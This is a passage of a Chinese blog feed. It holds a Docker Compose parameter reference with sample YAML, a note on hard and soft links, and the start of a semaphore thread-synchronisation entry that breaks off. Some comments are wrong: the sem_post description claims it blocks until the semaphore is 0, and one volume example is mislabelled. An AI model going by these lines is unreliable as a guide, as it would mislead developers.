class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line">Compose和Docker兼容性：</span><br><span class="line">    Compose 文件格式有3个版本,分别为1, 2.x 和 3.x</span><br><span class="line">    目前主流的为 3.x 其支持 docker 1.13.0 及其以上的版本</span><br><span class="line"></span><br><span class="line">常用参数：</span><br><span class="line">    version           <span class="comment"># 指定 compose 文件的版本</span></span><br><span class="line">    services          <span class="comment"># 定义所有的 service 信息, services 下面的第一级别的 key 既是一个 service 的名称</span></span><br><span class="line"></span><br><span class="line">        build                 <span class="comment"># 指定包含构建上下文的路径, 或作为一个对象，该对象具有 context 和指定的 dockerfile 文件以及 args 参数值</span></span><br><span class="line">            context               <span class="comment"># context: 指定 Dockerfile 文件所在的路径</span></span><br><span class="line">            dockerfile            <span class="comment"># dockerfile: 指定 context 指定的目录下面的 Dockerfile 的名称(默认为 Dockerfile)</span></span><br><span class="line">            args                  <span class="comment"># args: Dockerfile 在 build 过程中需要的参数 (等同于 docker container build --build-arg 的作用)</span></span><br><span class="line">            cache_from            <span class="comment"># v3.2中新增的参数, 指定缓存的镜像列表 (等同于 docker container build --cache_from 的作用)</span></span><br><span class="line">            labels                <span class="comment"># v3.3中新增的参数, 设置镜像的元数据 (等同于 docker container build --labels 的作用)</span></span><br><span class="line">            shm_size              <span class="comment"># v3.5中新增的参数, 设置容器 /dev/shm 分区的大小 (等同于 docker container build --shm-size 的作用)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">command</span>               <span class="comment"># 覆盖容器启动后默认执行的命令, 支持 shell 格式和 [] 格式</span></span><br><span class="line"></span><br><span class="line">        container_name        <span class="comment"># 指定容器的名称 (等同于 docker run --name 的作用)</span></span><br><span class="line"></span><br><span class="line">        deploy                <span class="comment"># v3 版本以上, 指定与部署和运行服务相关的配置, deploy 部分是 docker stack 使用的, docker stack 依赖 docker swarm</span></span><br><span class="line">            endpoint_mode         <span class="comment"># v3.3 版本中新增的功能, 指定服务暴露的方式</span></span><br><span class="line">                vip                   <span class="comment"># Docker 为该服务分配了一个虚拟 IP(VIP), 作为客户端的访问服务的地址</span></span><br><span class="line">                dnsrr                 <span class="comment"># DNS轮询, Docker 为该服务设置 DNS 条目, 使得服务名称的 DNS 查询返回一个 IP 地址列表, 客户端直接访问其中的一个地址</span></span><br><span class="line">            labels                <span class="comment"># 指定服务的标签，这些标签仅在服务上设置</span></span><br><span class="line">            mode                  <span class="comment"># 指定 deploy 的模式</span></span><br><span class="line">                global                <span class="comment"># 每个集群节点都只有一个容器</span></span><br><span class="line">                replicated            <span class="comment"># 用户可以指定集群中容器的数量(默认)</span></span><br><span class="line">            placement             <span class="comment"># 不知道怎么用</span></span><br><span class="line">            replicas              <span class="comment"># deploy 的 mode 为 replicated 时, 指定容器副本的数量</span></span><br><span class="line">            resources             <span class="comment"># 资源限制</span></span><br><span class="line">                limits                <span class="comment"># 设置容器的资源限制</span></span><br><span class="line">                    cpus: <span class="string">&quot;0.5&quot;</span>           <span class="comment"># 设置该容器最多只能使用 50% 的 CPU </span></span><br><span class="line">                    memory: 50M           <span class="comment"># 设置该容器最多只能使用 50M 的内存空间 </span></span><br><span class="line">                reservations          <span class="comment"># 设置为容器预留的系统资源(随时可用)</span></span><br><span class="line">                    cpus: <span class="string">&quot;0.2&quot;</span>           <span class="comment"># 为该容器保留 20% 的 CPU</span></span><br><span class="line">                    memory: 20M           <span class="comment"># 为该容器保留 20M 的内存空间</span></span><br><span class="line">            restart_policy        <span class="comment"># 定义容器重启策略, 用于代替 restart 参数</span></span><br><span class="line">                condition             <span class="comment"># 定义容器重启策略(接受三个参数)</span></span><br><span class="line">                    none                  <span class="comment"># 不尝试重启</span></span><br><span class="line">                    on-failure            <span class="comment"># 只有当容器内部应用程序出现问题才会重启</span></span><br><span class="line">                    any                   <span class="comment"># 无论如何都会尝试重启(默认)</span></span><br><span class="line">                delay                 <span class="comment"># 尝试重启的间隔时间(默认为 0s)</span></span><br><span class="line">                max_attempts          <span class="comment"># 尝试重启次数(默认一直尝试重启)</span></span><br><span class="line">                window                <span class="comment"># 检查重启是否成功之前的等待时间(即如果容器启动了, 隔多少秒之后去检测容器是否正常, 默认 0s)</span></span><br><span class="line">            update_config         <span class="comment"># 用于配置滚动更新配置</span></span><br><span class="line">                parallelism           <span class="comment"># 一次性更新的容器数量</span></span><br><span class="line">                delay                 <span class="comment"># 更新一组容器之间的间隔时间</span></span><br><span class="line">                failure_action        <span class="comment"># 定义更新失败的策略</span></span><br><span class="line">                    <span class="built_in">continue</span>              <span class="comment"># 继续更新</span></span><br><span class="line">                    rollback              <span class="comment"># 回滚更新</span></span><br><span class="line">                    pause                 <span class="comment"># 暂停更新(默认)</span></span><br><span class="line">                monitor               <span class="comment"># 每次更新后的持续时间以监视更新是否失败(单位: ns|us|ms|s|m|h) (默认为0)</span></span><br><span class="line">                max_failure_ratio     <span class="comment"># 回滚期间容忍的失败率(默认值为0)</span></span><br><span class="line">                order                 <span class="comment"># v3.4 版本中新增的参数, 回滚期间的操作顺序</span></span><br><span class="line">                    stop-first            <span class="comment">#旧任务在启动新任务之前停止(默认)</span></span><br><span class="line">                    start-first           <span class="comment">#首先启动新任务, 并且正在运行的任务暂时重叠</span></span><br><span class="line">            rollback_config       <span class="comment"># v3.7 版本中新增的参数, 用于定义在 update_config 更新失败的回滚策略</span></span><br><span class="line">                parallelism           <span class="comment"># 一次回滚的容器数, 如果设置为0, 则所有容器同时回滚</span></span><br><span class="line">                delay                 <span class="comment"># 每个组回滚之间的时间间隔(默认为0)</span></span><br><span class="line">                failure_action        <span class="comment"># 定义回滚失败的策略</span></span><br><span class="line">                    <span class="built_in">continue</span>              <span class="comment"># 继续回滚</span></span><br><span class="line">                    pause                 <span class="comment"># 暂停回滚</span></span><br><span class="line">                monitor               <span class="comment"># 每次回滚任务后的持续时间以监视失败(单位: ns|us|ms|s|m|h) (默认为0)</span></span><br><span class="line">                max_failure_ratio     <span class="comment"># 回滚期间容忍的失败率(默认值0)</span></span><br><span class="line">                order                 <span class="comment"># 回滚期间的操作顺序</span></span><br><span class="line">                    stop-first            <span class="comment"># 旧任务在启动新任务之前停止(默认)</span></span><br><span class="line">                    start-first           <span class="comment"># 首先启动新任务, 并且正在运行的任务暂时重叠</span></span><br><span class="line"></span><br><span class="line">            注意：</span><br><span class="line">                支持 docker-compose up 和 docker-compose run 但不支持 docker stack deploy 的子选项</span><br><span class="line">                security_opt  container_name  devices  tmpfs  stop_signal  links    cgroup_parent</span><br><span class="line">                network_mode  external_links  restart  build  userns_mode  sysctls</span><br><span class="line"></span><br><span class="line">        devices               <span class="comment"># 指定设备映射列表 (等同于 docker run --device 的作用)</span></span><br><span class="line"></span><br><span class="line">        depends_on            <span class="comment"># 定义容器启动顺序 (此选项解决了容器之间的依赖关系， 此选项在 v3 版本中 使用 swarm 部署时将忽略该选项)</span></span><br><span class="line">            示例：</span><br><span class="line">                docker-compose up 以依赖顺序启动服务，下面例子中 redis 和 db 服务在 web 启动前启动</span><br><span class="line">                默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系</span><br><span class="line">                version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">                services:</span><br><span class="line">                    web:</span><br><span class="line">                        build: .</span><br><span class="line">                        depends_on:</span><br><span class="line">                            - db      </span><br><span class="line">                            - redis  </span><br><span class="line">                    redis:</span><br><span class="line">                        image: redis</span><br><span class="line">                    db:</span><br><span class="line">                        image: postgres                             </span><br><span class="line"></span><br><span class="line">        dns                   <span class="comment"># 设置 DNS 地址(等同于 docker run --dns 的作用)</span></span><br><span class="line"></span><br><span class="line">        dns_search            <span class="comment"># 设置 DNS 搜索域(等同于 docker run --dns-search 的作用)</span></span><br><span class="line"></span><br><span class="line">        tmpfs                 <span class="comment"># v2 版本以上, 挂载目录到容器中, 作为容器的临时文件系统(等同于 docker run --tmpfs 的作用, 在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        entrypoint            <span class="comment"># 覆盖容器的默认 entrypoint 指令 (等同于 docker run --entrypoint 的作用)</span></span><br><span class="line"></span><br><span class="line">        env_file              <span class="comment"># 从指定文件中读取变量设置为容器中的环境变量, 可以是单个值或者一个文件列表, 如果多个文件中的变量重名则后面的变量覆盖前面的变量, environment 的值覆盖 env_file 的值</span></span><br><span class="line">            文件格式：</span><br><span class="line">                RACK_ENV=development </span><br><span class="line"></span><br><span class="line">        environment           <span class="comment"># 设置环境变量， environment 的值可以覆盖 env_file 的值 (等同于 docker run --env 的作用)</span></span><br><span class="line"></span><br><span class="line">        expose                <span class="comment"># 暴露端口, 但是不能和宿主机建立映射关系, 类似于 Dockerfile 的 EXPOSE 指令</span></span><br><span class="line"></span><br><span class="line">        external_links        <span class="comment"># 连接不在 docker-compose.yml 中定义的容器或者不在 compose 管理的容器(docker run 启动的容器, 在 v3 版本中使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        extra_hosts           <span class="comment"># 添加 host 记录到容器中的 /etc/hosts 中 (等同于 docker run --add-host 的作用)</span></span><br><span class="line"></span><br><span class="line">        healthcheck           <span class="comment"># v2.1 以上版本, 定义容器健康状态检查, 类似于 Dockerfile 的 HEALTHCHECK 指令</span></span><br><span class="line">            <span class="built_in">test</span>                  <span class="comment"># 检查容器检查状态的命令, 该选项必须是一个字符串或者列表, 第一项必须是 NONE, CMD 或 CMD-SHELL, 如果其是一个字符串则相当于 CMD-SHELL 加该字符串</span></span><br><span class="line">                NONE                  <span class="comment"># 禁用容器的健康状态检测</span></span><br><span class="line">                CMD                   <span class="comment"># test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost&quot;]</span></span><br><span class="line">                CMD-SHELL             <span class="comment"># test: [&quot;CMD-SHELL&quot;, &quot;curl -f http://localhost || exit 1&quot;] 或者　test: curl -f https://localhost || exit 1</span></span><br><span class="line">            interval: 1m30s       <span class="comment"># 每次检查之间的间隔时间</span></span><br><span class="line">            <span class="built_in">timeout</span>: 10s          <span class="comment"># 运行命令的超时时间</span></span><br><span class="line">            retries: 3            <span class="comment"># 重试次数</span></span><br><span class="line">            start_period: 40s     <span class="comment"># v3.4 以上新增的选项, 定义容器启动时间间隔</span></span><br><span class="line">            <span class="built_in">disable</span>: <span class="literal">true</span>         <span class="comment"># true 或 false, 表示是否禁用健康状态检测和　test: NONE 相同</span></span><br><span class="line"></span><br><span class="line">        image                 <span class="comment"># 指定 docker 镜像, 可以是远程仓库镜像、本地镜像</span></span><br><span class="line"></span><br><span class="line">        init                  <span class="comment"># v3.7 中新增的参数, true 或 false 表示是否在容器中运行一个 init, 它接收信号并传递给进程</span></span><br><span class="line"></span><br><span class="line">        isolation             <span class="comment"># 隔离容器技术, 在 Linux 中仅支持 default 值</span></span><br><span class="line"></span><br><span class="line">        labels                <span class="comment"># 使用 Docker 标签将元数据添加到容器, 与 Dockerfile 中的 LABELS 类似</span></span><br><span class="line"></span><br><span class="line">        links                 <span class="comment"># 链接到其它服务中的容器, 该选项是 docker 历史遗留的选项, 目前已被用户自定义网络名称空间取代, 最终有可能被废弃 (在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        logging               <span class="comment"># 设置容器日志服务</span></span><br><span class="line">            driver                <span class="comment"># 指定日志记录驱动程序, 默认 json-file (等同于 docker run --log-driver 的作用)</span></span><br><span class="line">            options               <span class="comment"># 指定日志的相关参数 (等同于 docker run --log-opt 的作用)</span></span><br><span class="line">                max-size              <span class="comment"># 设置单个日志文件的大小, 当到达这个值后会进行日志滚动操作</span></span><br><span class="line">                max-file              <span class="comment"># 日志文件保留的数量</span></span><br><span class="line"></span><br><span class="line">        network_mode          <span class="comment"># 指定网络模式 (等同于 docker run --net 的作用, 在使用 swarm 部署时将忽略该选项)         </span></span><br><span class="line"></span><br><span class="line">        networks              <span class="comment"># 将容器加入指定网络 (等同于 docker network connect 的作用), networks 可以位于 compose 文件顶级键和 services 键的二级键</span></span><br><span class="line">            aliases               <span class="comment"># 同一网络上的容器可以使用服务名称或别名连接到其中一个服务的容器</span></span><br><span class="line">            ipv4_address      <span class="comment"># IP V4 格式</span></span><br><span class="line">            ipv6_address      <span class="comment"># IP V6 格式</span></span><br><span class="line"></span><br><span class="line">            示例:</span><br><span class="line">                version: <span class="string">&#x27;3.7&#x27;</span></span><br><span class="line">                services: </span><br><span class="line">                    <span class="built_in">test</span>: </span><br><span class="line">                        image: nginx:1.14-alpine</span><br><span class="line">                        container_name: mynginx</span><br><span class="line">                        <span class="built_in">command</span>: ifconfig</span><br><span class="line">                        networks: </span><br><span class="line">                            app_net:                                <span class="comment"># 调用下面 networks 定义的 app_net 网络</span></span><br><span class="line">                            ipv4_address: 172.16.238.10</span><br><span class="line">                networks:</span><br><span class="line">                    app_net:</span><br><span class="line">                        driver: bridge</span><br><span class="line">                        ipam:</span><br><span class="line">                            driver: default</span><br><span class="line">                            config:</span><br><span class="line">                                - subnet: 172.16.238.0/24</span><br><span class="line"></span><br><span class="line">        pid: <span class="string">&#x27;host&#x27;</span>           <span class="comment"># 共享宿主机的 进程空间(PID)</span></span><br><span class="line"></span><br><span class="line">        ports                 <span class="comment"># 建立宿主机和容器之间的端口映射关系, ports 支持两种语法格式</span></span><br><span class="line">            SHORT 语法格式示例:</span><br><span class="line">                - <span class="string">&quot;3000&quot;</span>                            <span class="comment"># 暴露容器的 3000 端口, 宿主机的端口由 docker 随机映射一个没有被占用的端口</span></span><br><span class="line">                - <span class="string">&quot;3000-3005&quot;</span>                       <span class="comment"># 暴露容器的 3000 到 3005 端口, 宿主机的端口由 docker 随机映射没有被占用的端口</span></span><br><span class="line">                - <span class="string">&quot;8000:8000&quot;</span>                       <span class="comment"># 容器的 8000 端口和宿主机的 8000 端口建立映射关系</span></span><br><span class="line">                - <span class="string">&quot;9090-9091:8080-8081&quot;</span></span><br><span class="line">                - <span class="string">&quot;127.0.0.1:8001:8001&quot;</span>             <span class="comment"># 指定映射宿主机的指定地址的</span></span><br><span class="line">                - <span class="string">&quot;127.0.0.1:5000-5010:5000-5010&quot;</span>   </span><br><span class="line">                - <span class="string">&quot;6060:6060/udp&quot;</span>                   <span class="comment"># 指定协议</span></span><br><span class="line"></span><br><span class="line">            LONG 语法格式示例:(v3.2 新增的语法格式)</span><br><span class="line">                ports:</span><br><span class="line">                    - target: 80                    <span class="comment"># 容器端口</span></span><br><span class="line">                      published: 8080               <span class="comment"># 宿主机端口</span></span><br><span class="line">                      protocol: tcp                 <span class="comment"># 协议类型</span></span><br><span class="line">                      mode: host                    <span class="comment"># host 在每个节点上发布主机端口,  ingress 对于群模式端口进行负载均衡</span></span><br><span class="line"></span><br><span class="line">        secrets               <span class="comment"># 不知道怎么用</span></span><br><span class="line"></span><br><span class="line">        security_opt          <span class="comment"># 为每个容器覆盖默认的标签 (在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        stop_grace_period     <span class="comment"># 指定在发送了 SIGTERM 信号之后, 容器等待多少秒之后退出(默认 10s)</span></span><br><span class="line"></span><br><span class="line">        stop_signal           <span class="comment"># 指定停止容器发送的信号 (默认为 SIGTERM 相当于 kill PID; SIGKILL 相当于 kill -9 PID; 在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        sysctls               <span class="comment"># 设置容器中的内核参数 (在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        ulimits               <span class="comment"># 设置容器的 limit</span></span><br><span class="line"></span><br><span class="line">        userns_mode           <span class="comment"># 如果Docker守护程序配置了用户名称空间, 则禁用此服务的用户名称空间 (在使用 swarm 部署时将忽略该选项)</span></span><br><span class="line"></span><br><span class="line">        volumes               <span class="comment"># 定义容器和宿主机的卷映射关系, 其和 networks 一样可以位于 services 键的二级键和 compose 顶级键, 如果需要跨服务间使用则在顶级键定义, 在 services 中引用</span></span><br><span class="line">            SHORT 语法格式示例:</span><br><span class="line">                volumes:</span><br><span class="line">                    - /var/lib/mysql                <span class="comment"># 映射容器内的 /var/lib/mysql 到宿主机的一个随机目录中</span></span><br><span class="line">                    - /opt/data:/var/lib/mysql      <span class="comment"># 映射容器内的 /var/lib/mysql 到宿主机的 /opt/data</span></span><br><span class="line">                    - ./cache:/tmp/cache            <span class="comment"># 映射容器内的 /var/lib/mysql 到宿主机 compose 文件所在的位置</span></span><br><span class="line">                    - ~/configs:/etc/configs/:ro    <span class="comment"># 映射容器宿主机的目录到容器中去, 权限只读</span></span><br><span class="line">                    - datavolume:/var/lib/mysql     <span class="comment"># datavolume 为 volumes 顶级键定义的目录, 在此处直接调用</span></span><br><span class="line"></span><br><span class="line">            LONG 语法格式示例:(v3.2 新增的语法格式)</span><br><span class="line">                version: <span class="string">&quot;3.2&quot;</span></span><br><span class="line">                services:</span><br><span class="line">                    web:</span><br><span class="line">                        image: nginx:alpine</span><br><span class="line">                        ports:</span><br><span class="line">                            - <span class="string">&quot;80:80&quot;</span></span><br><span class="line">                        volumes:</span><br><span class="line">                            - <span class="built_in">type</span>: volume                  <span class="comment"># mount 的类型, 必须是 bind、volume 或 tmpfs</span></span><br><span class="line">                                <span class="built_in">source</span>: mydata              <span class="comment"># 宿主机目录</span></span><br><span class="line">                                target: /data               <span class="comment"># 容器目录</span></span><br><span class="line">                                volume:                     <span class="comment"># 配置额外的选项, 其 key 必须和 type 的值相同</span></span><br><span class="line">                                    nocopy: <span class="literal">true</span>                <span class="comment"># volume 额外的选项, 在创建卷时禁用从容器复制数据</span></span><br><span class="line">                            - <span class="built_in">type</span>: <span class="built_in">bind</span>                    <span class="comment"># volume 模式只指定容器路径即可, 宿主机路径随机生成; bind 需要指定容器和数据机的映射路径</span></span><br><span class="line">                                <span class="built_in">source</span>: ./static</span><br><span class="line">                                target: /opt/app/static</span><br><span class="line">                                read_only: <span class="literal">true</span>             <span class="comment"># 设置文件系统为只读文件系统</span></span><br><span class="line">                volumes:</span><br><span class="line">                    mydata:                                 <span class="comment"># 定义在 volume, 可在所有服务中调用</span></span><br><span class="line"></span><br><span class="line">        restart               <span class="comment"># 定义容器重启策略(在使用 swarm 部署时将忽略该选项, 在 swarm 使用 restart_policy 代替 restart)</span></span><br><span class="line">            no                    <span class="comment"># 禁止自动重启容器(默认)</span></span><br><span class="line">            always                <span class="comment"># 无论如何容器都会重启</span></span><br><span class="line">            on-failure            <span class="comment"># 当出现 on-failure 报错时, 容器重新启动</span></span><br><span class="line"></span><br><span class="line">        其他选项：</span><br><span class="line">            domainname, hostname, ipc, mac_address, privileged, read_only, shm_size, stdin_open, <span class="built_in">tty</span>, user, working_dir</span><br><span class="line">            上面这些选项都只接受单个值和 docker run 的对应参数类似</span><br><span class="line"></span><br><span class="line">        对于值为时间的可接受的值：</span><br><span class="line">            2.5s</span><br><span class="line">            10s</span><br><span class="line">            1m30s</span><br><span class="line">            2h32m</span><br><span class="line">            5h34m56s</span><br><span class="line">            时间单位: us, ms, s, m， h</span><br><span class="line">        对于值为大小的可接受的值：</span><br><span class="line">            2b</span><br><span class="line">            1024kb</span><br><span class="line">            2048k</span><br><span class="line">            300m</span><br><span class="line">            1gb</span><br><span class="line">            单位: b, k, m, g 或者 kb, mb, gb</span><br><span class="line">    networks          <span class="comment"># 定义 networks 信息</span></span><br><span class="line">        driver                <span class="comment"># 指定网络模式, 大多数情况下, 它 bridge 于单个主机和 overlay Swarm 上</span></span><br><span class="line">            bridge                <span class="comment"># Docker 默认使用 bridge 连接单个主机上的网络</span></span><br><span class="line">            overlay               <span class="comment"># overlay 驱动程序创建一个跨多个节点命名的网络</span></span><br><span class="line">            host                  <span class="comment"># 共享主机网络名称空间(等同于 docker run --net=host)</span></span><br><span class="line">            none                  <span class="comment"># 等同于 docker run --net=none</span></span><br><span class="line">        driver_opts           <span class="comment"># v3.2以上版本, 传递给驱动程序的参数, 这些参数取决于驱动程序</span></span><br><span class="line">        attachable            <span class="comment"># driver 为 overlay 时使用, 如果设置为 true 则除了服务之外，独立容器也可以附加到该网络; 如果独立容器连接到该网络，则它可以与其他 Docker 守护进程连接到的该网络的服务和独立容器进行通信</span></span><br><span class="line">        ipam                  <span class="comment"># 自定义 IPAM 配置. 这是一个具有多个属性的对象, 每个属性都是可选的</span></span><br><span class="line">            driver                <span class="comment"># IPAM 驱动程序, bridge 或者 default</span></span><br><span class="line">            config                <span class="comment"># 配置项</span></span><br><span class="line">                subnet                <span class="comment"># CIDR格式的子网，表示该网络的网段</span></span><br><span class="line">        external              <span class="comment"># 外部网络, 如果设置为 true 则 docker-compose up 不会尝试创建它, 如果它不存在则引发错误</span></span><br><span class="line">        name                  <span class="comment"># v3.5 以上版本, 为此网络设置名称</span></span><br><span class="line">文件格式示例：</span><br><span class="line">    version: <span class="string">&quot;3&quot;</span></span><br><span class="line">    services:</span><br><span class="line">      redis:</span><br><span class="line">        image: redis:alpine</span><br><span class="line">        ports:</span><br><span class="line">          - <span class="string">&quot;6379&quot;</span></span><br><span class="line">        networks:</span><br><span class="line">          - frontend</span><br><span class="line">        deploy:</span><br><span class="line">          replicas: 2</span><br><span class="line">          update_config:</span><br><span class="line">            parallelism: 2</span><br><span class="line">            delay: 10s</span><br><span class="line">          restart_policy:</span><br><span class="line">            condition: on-failure</span><br><span class="line">      db:</span><br><span class="line">        image: postgres:9.4</span><br><span class="line">        volumes:</span><br><span class="line">          - db-data:/var/lib/postgresql/data</span><br><span class="line">        networks:</span><br><span class="line">          - backend</span><br><span class="line">        deploy:</span><br><span class="line">          placement:</span><br><span class="line">            constraints: [node.role == manager]</span><br></pre></td></tr></table></figure><h3 id="7-小结"><a href="#7-小结" class="headerlink" title="7.小结"></a>7.小结</h3><p>docker是一个非常方便的服务部署工具，不仅解决了开发环境和运行环境的不一致性，并且使用docker进行部署的服务非常容易进行迁移，并且docker使用联合文件系统，极大地节省了运行docker容器时候地资源，在实际生产开发中非常值得使用。</p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬链接和软链接</title>
      <link href="/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/"/>
      <url>/2022/04/17/%E7%A1%AC%E9%93%BE%E6%8E%A5%E5%92%8C%E8%BD%AF%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="硬链接和软链接"><a href="#硬链接和软链接" class="headerlink" title="硬链接和软链接"></a>硬链接和软链接</h1><h3 id="1-inode的概念"><a href="#1-inode的概念" class="headerlink" title="1.inode的概念"></a>1.inode的概念</h3><p>文件存储在磁盘上,磁盘在格式化文件系统后,分为两个部分,一个是inode存储区,一个是数据存储区,每个inode存储了这个文件的详细信息,这些信息一般有:</p><ul><li>1.文件的所属者</li><li>2.文件的所属组</li><li>3.文件的权限</li><li>4.文件的创建时间</li><li>5.文件最近修改的时间</li><li>6.文件的最近访问时间</li><li>7.链接数,(有多少个链接指向这个文件)</li><li>8.文件的大小</li></ul><p>用户可以使用stat命令查看这些信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> filename</span><br></pre></td></tr></table></figure><p>在linux平台上,</p><p>linux并不使用文件名识别文件,而使用inode识别文件,因此linux下每个文件名都指向了一个inode,在用户访问文件时,linux内部首先会获取要访问文件的inode号码,从inode里面获取真正的数据存储区。获取文件数据,在删除文件的时候,文件的links减1,当links减到0时,inode会被删除  </p><p>用户可以使用stat命令查看这些信息</p><h3 id="2-硬链接"><a href="#2-硬链接" class="headerlink" title="2.硬链接"></a>2.硬链接</h3><p>硬链接和源文件拥有相同的inode,<br>linux使用ln 源文件名 目标文件名创建硬链接,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> /path/to/sourcefile /path/to/destnaionfile</span><br></pre></td></tr></table></figure><h3 id="3-软链接"><a href="#3-软链接" class="headerlink" title="3.软链接"></a>3.软链接</h3><p>​软连接是一个存在的文件,但是文件里面存储的内容是目标文件的路径</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>硬链接和软链接最主要的区别就是硬链接文件指向的inode和链接的文件指向的inode是同一个，而软链接则是一个普通的文件但是它里面存放的信息是需要链接的文件的路径。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程同步</title>
      <link href="/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"/>
      <url>/2022/04/17/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h3 id="1-使用信号量实现线程同步"><a href="#1-使用信号量实现线程同步" class="headerlink" title="1.使用信号量实现线程同步"></a>1.使用信号量实现线程同步</h3><h3 id="使用的api"><a href="#使用的api" class="headerlink" title="使用的api"></a>使用的api</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sem_init</span><span class="params">(<span class="type">sem_t</span> *sem,<span class="type">int</span> shared,<span class="type">int</span> value)</span>;<span class="comment">//初始化无名信号灯</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_wait</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;<span class="comment">//p操作,如果信号量大于0,则信号量-1,函数立即返回,否则函数进入阻塞状态直到信号量大于0</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sem_post</span><span class="params">(<span class="type">sem_t</span> *sem)</span>;<span class="comment">//v操作,如果信号量等于0,则信号量+1,函数立即返回,否则函数进入阻塞状态,直到信号量等于0</span></span><br></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 